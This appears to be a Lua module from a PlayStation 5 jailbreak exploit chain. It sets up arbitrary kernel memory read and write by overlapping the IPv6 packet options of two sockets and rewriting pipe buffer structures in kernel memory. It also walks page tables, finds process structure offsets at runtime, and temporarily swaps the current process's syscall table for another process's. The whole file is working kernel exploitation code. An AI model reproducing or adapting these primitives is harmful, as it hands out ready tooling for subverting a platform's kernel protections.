
-- class for kernel memory r/w

kernel = {}

kernel.addr = {}

-- these vars need to be defined for other fns to work properly
kernel.copyout = nil
kernel.copyin = nil
kernel.read_buffer = nil
kernel.write_buffer = nil

function kernel.read_byte(kaddr)
    local value = kernel.read_buffer(kaddr, 1)
    return value and #value == 1 and uint64.unpack(value) or nil 
end

function kernel.read_word(kaddr)
    local value = kernel.read_buffer(kaddr, 2)
    return value and #value == 2 and uint64.unpack(value) or nil 
end

function kernel.read_dword(kaddr)
    local value = kernel.read_buffer(kaddr, 4)
    return value and #value == 4 and uint64.unpack(value) or nil 
end

function kernel.read_qword(kaddr)
    local value = kernel.read_buffer(kaddr, 8)
    return value and #value == 8 and uint64.unpack(value) or nil 
end

function kernel.hex_dump(kaddr, size)
    size = size or 0x40
    return hex_dump(kernel.read_buffer(kaddr, size), kaddr)
end

function kernel.read_null_terminated_string(kaddr)
    
    local result = ""

    while true do
        local chunk = kernel.read_buffer(kaddr, 0x8)
        local null_pos = chunk:find("\0")
        if null_pos then 
            return result .. chunk:sub(1, null_pos - 1)
        end
        result = result .. chunk
        kaddr = kaddr + #chunk
    end
    
    if string.byte(result[1]) == 0 then
        return nil
    end

    return result
end

function kernel.write_byte(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,1))
end

function kernel.write_word(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,2))
end

function kernel.write_dword(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,4))
end

function kernel.write_qword(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,8))
end





-- provide fast kernel r/w through pipe pair & ipv6

ipv6_kernel_rw = {}

ipv6_kernel_rw.data = {}

function ipv6_kernel_rw.init(ofiles, kread8, kwrite8)

    ipv6_kernel_rw.ofiles = ofiles
    ipv6_kernel_rw.kread8 = kread8
    ipv6_kernel_rw.kwrite8 = kwrite8

    ipv6_kernel_rw.create_pipe_pair()
    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
end

function ipv6_kernel_rw.get_fd_data_addr(fd)
    local filedescent_addr = ipv6_kernel_rw.ofiles + fd * 0x30
    local file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0) -- fde_file
    return ipv6_kernel_rw.kread8(file_addr + 0x0) -- f_data
end

function ipv6_kernel_rw.create_pipe_pair()

    local read_fd, write_fd = create_pipe()
    
    ipv6_kernel_rw.data.pipe_read_fd = read_fd
    ipv6_kernel_rw.data.pipe_write_fd = write_fd
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd)
    ipv6_kernel_rw.data.pipemap_buffer = memory.alloc(0x14)
    ipv6_kernel_rw.data.read_mem = memory.alloc(PAGE_SIZE)
end

-- overlap the pktopts of two IPV6 sockets
function ipv6_kernel_rw.create_overlapped_ipv6_sockets()

    local master_target_buffer = memory.alloc(0x14)
    local slave_buffer = memory.alloc(0x14)
    local pktinfo_size_store = memory.alloc(0x8)
    
    memory.write_qword(pktinfo_size_store, 0x14)

    local master_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
    local victim_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()

    syscall.setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14)
    syscall.setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14)

    local master_pcb = ipv6_kernel_rw.kread8(ipv6_kernel_rw.get_fd_data_addr(master_sock) + 0x18)
    local master_pktopts = ipv6_kernel_rw.kread8(master_pcb + 0x120)

    local slave_pcb = ipv6_kernel_rw.kread8(ipv6_kernel_rw.get_fd_data_addr(victim_sock) + 0x18)
    local slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + 0x120)

    -- magic
    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10, slave_pktopts + 0x10)

    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
    ipv6_kernel_rw.data.slave_buffer = slave_buffer
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store
    ipv6_kernel_rw.data.master_sock = master_sock
    ipv6_kernel_rw.data.victim_sock = victim_sock
end

function ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.master_target_buffer + 0x10, 0)
    syscall.setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14)
end

function ipv6_kernel_rw.ipv6_kread(kaddr, buffer_addr)
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    syscall.getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store)
end

function ipv6_kernel_rw.ipv6_kwrite(kaddr, buffer_addr)
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    syscall.setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14)
end

function ipv6_kernel_rw.ipv6_kread8(kaddr)
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer)
    return memory.read_qword(ipv6_kernel_rw.data.slave_buffer)
end

function ipv6_kernel_rw.copyout(kaddr, uaddr, len)

    assert(kaddr and uaddr and len)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, uint64("0x4000000040000000"))
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
    
    syscall.read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len)
end

function ipv6_kernel_rw.copyin(uaddr, kaddr, len)

    assert(kaddr and uaddr and len)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, 0)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)

    syscall.write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len)
end

function ipv6_kernel_rw.read_buffer(kaddr, len)

    local mem = ipv6_kernel_rw.data.read_mem
    if len > PAGE_SIZE then
        mem = memory.alloc(len)
    end

    ipv6_kernel_rw.copyout(kaddr, mem, len)
    return memory.read_buffer(mem, len)
end

function ipv6_kernel_rw.write_buffer(kaddr, buf)
    ipv6_kernel_rw.copyin(lua.resolve_value(buf), kaddr, #buf)
end





-- cpu page table

CPU_PDE = {
    PRESENT = 0,
    RW = 1,
    USER = 2,
    WRITE_THROUGH = 3,
    CACHE_DISABLE = 4,
    ACCESSED = 5,
    DIRTY = 6,
    PS = 7,
    GLOBAL = 8,
    XOTEXT = 58,
    PROTECTION_KEY = 59,
    EXECUTE_DISABLE = 63
}

CPU_PDE_MASKS = {
    PRESENT = 1,
    RW = 1,
    USER = 1,
    WRITE_THROUGH = 1,
    CACHE_DISABLE = 1,
    ACCESSED = 1,
    DIRTY = 1,
    PS = 1,
    GLOBAL = 1,
    XOTEXT = 1,
    PROTECTION_KEY = 0xf,
    EXECUTE_DISABLE = 1
}

CPU_PG_PHYS_FRAME = uint64("0x000ffffffffff000")
CPU_PG_PS_FRAME = uint64("0x000fffffffe00000")

function cpu_pde_field(pde, field)
    local shift = CPU_PDE[field]
    local mask = CPU_PDE_MASKS[field]
    return bit64.band(bit64.rshift(pde, shift), mask):tonumber()
end

function cpu_walk_pt(cr3, vaddr)

    assert(vaddr, cr3)

    local pml4e_index = bit64.band(bit64.rshift(vaddr, 39), 0x1ff)
    local pdpe_index = bit64.band(bit64.rshift(vaddr, 30), 0x1ff)
    local pde_index = bit64.band(bit64.rshift(vaddr, 21), 0x1ff)
    local pte_index = bit64.band(bit64.rshift(vaddr, 12), 0x1ff)

    -- pml4

    local pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8)
    if cpu_pde_field(pml4e, "PRESENT") ~= 1 then
        return nil
    end

    -- pdp

    local pdp_base_pa = bit64.band(pml4e, CPU_PG_PHYS_FRAME)
    local pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8
    local pdpe = kernel.read_qword(pdpe_va)

    if cpu_pde_field(pdpe, "PRESENT") ~= 1 then
        return nil
    end

    -- pd

    local pd_base_pa = bit64.band(pdpe, CPU_PG_PHYS_FRAME)
    local pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8
    local pde = kernel.read_qword(pde_va)

    if cpu_pde_field(pde, "PRESENT") ~= 1 then
        return nil
    end

    -- large page
    if cpu_pde_field(pde, "PS") == 1 then
        return bit64.bor(
            bit64.band(pde, CPU_PG_PS_FRAME),
            bit64.band(vaddr, 0x1fffff) -- todo: remove hardcoded value
        )
    end

    -- pt

    local pt_base_pa = bit64.band(pde, CPU_PG_PHYS_FRAME)
    local pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
    local pte = kernel.read_qword(pte_va)

    if cpu_pde_field(pte, "PRESENT") ~= 1 then
        return nil
    end

    return bit64.bor(
        bit64.band(pte, CPU_PG_PHYS_FRAME),
        bit64.band(vaddr, 0x3fff)
    )
end





-- setup kernel r/w for the loader
function initialize_kernel_rw()

    local state = storage.get("kernel_rw")
    if state then

        -- copy ipv6 states given by the exploit
        ipv6_kernel_rw.data = state.ipv6_kernel_rw_data
        
        -- copy existing resolved addresses from exploit
        kernel.addr = state.kernel_addr
        
        -- enable kernel r/w through ipv6 + pipe
        kernel.copyout = ipv6_kernel_rw.copyout
        kernel.copyin = ipv6_kernel_rw.copyin
        kernel.read_buffer = ipv6_kernel_rw.read_buffer
        kernel.write_buffer = ipv6_kernel_rw.write_buffer

        kernel.rw_initialized = true

        if is_jailbroken() then
            initialize_kernel_offsets()
        end
    end
end


function initialize_kernel_offsets()

    kernel_offset = get_ps5_kernel_offset()

    -- find some structure offsets on runtime
    local offsets = find_offsets()
    
    for k,v in pairs(offsets) do
        kernel_offset[k] = v
    end

end

-- credit: @hammer-83
function find_vmspace_pmap_offset()

    local vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE)
    
    -- Note, this is the offset of vm_space.vm_map.pmap on 1.xx.
    -- It is assumed that on higher firmwares it's only increasing.
    local cur_scan_offset = 0x1C8
    
    for i=1,6 do
        local scan_val = kernel.read_qword(vmspace + cur_scan_offset + (i * 8))
        local offset_diff = (scan_val - vmspace):tonumber()
        if offset_diff >= 0x2C0 and offset_diff <= 0x2F0 then
            return cur_scan_offset + (i * 8)
        end
    end

    error("failed to find VMSPACE_VM_PMAP offset")
end


-- credit: @hammer-83
function find_vmspace_vmid_offset()

    local vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE)

    -- Note, this is the offset of vm_space.vm_map.vmid on 1.xx.
    -- It is assumed that on higher firmwares it's only increasing.
    local cur_scan_offset = 0x1D4
    
    for i=1,8 do
        local scan_offset = cur_scan_offset + (i * 4)
        local scan_val = kernel.read_dword(vmspace + scan_offset):tonumber()
        if scan_val > 0 and scan_val <= 0x10 then
            return scan_offset
        end
    end

    error("failed to find VMSPACE_VM_VMID offset")
end


function find_proc_offsets()

    local proc_data = kernel.read_buffer(kernel.addr.curproc, 0x1000)
    local proc_data_addr = lua.resolve_value(proc_data)

    local p_comm_sign = find_pattern(proc_data, "ce fa ef be cc bb")
    local p_sysent_sign = find_pattern(proc_data, "ff ff ff ff ff ff ff 7f")

    if not p_comm_sign then
        error("failed to find offset for PROC_COMM")
    end

    if not p_sysent_sign then
        error("failed to find offset for PROC_SYSENT")
    end

    local p_comm_offset = p_comm_sign[1] - 1 + 0x8
    local p_sysent_offset = p_sysent_sign[1] - 1 - 0x10

    return {
        PROC_COMM = p_comm_offset,
        PROC_SYSENT = p_sysent_offset
    }
end

function find_offsets()

    check_jailbroken()

    local proc_offsets = find_proc_offsets()
    local vm_map_pmap_offset = find_vmspace_pmap_offset()
    local vm_map_vmid_offset =  find_vmspace_vmid_offset()

    return {
        PROC_COMM = proc_offsets.PROC_COMM,
        PROC_SYSENT = proc_offsets.PROC_SYSENT,
        VMSPACE_VM_PMAP = vm_map_pmap_offset,
        VMSPACE_VM_VMID = vm_map_vmid_offset,
    }
end





-- useful functions

function find_proc_by_name(name)

    check_jailbroken()

    local proc = kernel.read_qword(kernel.addr.allproc)
    while proc ~= uint64(0) do

        local proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM)
        if proc_name == name then
            return proc
        end

        proc = kernel.read_qword(proc + 0x0) -- le_next
    end

    return nil
end


function find_proc_by_pid(pid)

    check_jailbroken()
    assert(type(pid) == "number")

    local proc = kernel.read_qword(kernel.addr.allproc)
    while proc ~= uint64(0) do

        local proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID):tonumber()
        if proc_pid == pid then
            return proc
        end

        proc = kernel.read_qword(proc + 0x0) -- le_next
    end

    return nil
end


function get_proc_cr3(proc)
    
    check_jailbroken()
    
    local vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE)
    local pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP)
    
    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3)
end

-- translate virtual address to physical address
-- note: use kernel page table if cr3 is not given
function virt_to_phys(virt_addr, cr3)
    
    assert(kernel.addr.dmap_base and virt_addr)
    
    cr3 = cr3 or kernel.addr.kernel_cr3
    return cpu_walk_pt(cr3, virt_addr)
end


function phys_to_dmap(phys_addr)
    assert(kernel.addr.dmap_base and phys_addr)
    return kernel.addr.dmap_base + phys_addr
end


-- replace curproc sysent with sysent of other ps5 process
-- note: failure to restore curproc sysent will have side effect on the game/ps
function run_with_ps5_syscall_enabled(f)

    check_jailbroken()

    local target_proc_name = "SceGameLiveStreaming" -- arbitrarily chosen ps5 process

    local target_proc = find_proc_by_name(target_proc_name) 
    if not target_proc then
        errorf("failed to find proc addr of %s", target_proc_name)
    end

    local cur_sysent = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_SYSENT)  -- struct sysentvec
    local target_sysent = kernel.read_qword(target_proc + kernel_offset.PROC_SYSENT)

    local cur_table_size = kernel.read_dword(cur_sysent) -- sv_size
    local target_table_size = kernel.read_dword(target_sysent)

    local cur_table = kernel.read_qword(cur_sysent + 0x8) -- sv_table
    local target_table = kernel.read_qword(target_sysent + 0x8)

    -- replace with target sysent
    kernel.write_dword(cur_sysent, target_table_size)
    kernel.write_qword(cur_sysent + 0x8, target_table)

    -- catch lua error so we can restore sysent
    local err = run_with_coroutine(f)
    if err then
        print(err)
    end
    
    -- restore back
    kernel.write_dword(cur_sysent, cur_table_size)
    kernel.write_qword(cur_sysent + 0x8, cur_table) 
end

